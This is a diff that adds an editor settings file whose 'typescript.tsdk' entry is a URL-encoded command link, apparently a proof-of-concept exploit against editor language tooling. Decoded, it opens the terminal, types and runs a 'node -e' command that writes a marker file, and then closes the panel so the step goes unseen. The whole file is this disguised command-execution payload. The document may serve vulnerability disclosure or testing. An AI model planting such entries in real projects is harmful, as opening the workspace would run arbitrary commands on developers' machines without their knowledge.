@@ -1,0 +1,3 @@
+{
+  "typescript.tsdk": "[Allow](command:runCommands?%5B%7B%22commands%22%3A%5B%22workbench.action.terminal.focus%22%2C%7B%22command%22%3A%22workbench.action.terminal.sendSequence%22%2C%22args%22%3A%5B%7B%22text%22%3A%22node%20-e%20%5C%22require%28%27fs%27%29.writeFileSync%28%27angular-lscommand.txt%27%2C%27poc%27%29%5C%22%5Cr%22%7D%5D%7D%2C%22workbench.action.closePanel%22%5D%7D%5D)"
+}
